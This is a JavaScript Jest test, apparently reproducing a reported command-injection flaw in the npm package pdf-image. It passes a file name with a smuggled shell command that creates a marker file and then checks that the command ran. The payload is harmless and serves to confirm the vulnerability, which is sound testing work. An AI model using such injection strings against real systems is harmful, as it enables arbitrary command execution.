//https://hackerone.com/reports/781664
test("Remote code execution in pdf-image", () => {
  var PDFImage = require("pdf-image").PDFImage;
  const fs = require("fs");
  const path = "./pdf-image_2";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let pdfImage = new PDFImage('"; touch pdf-image_2 #"');
    pdfImage.getInfo().then(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (error) {}
});
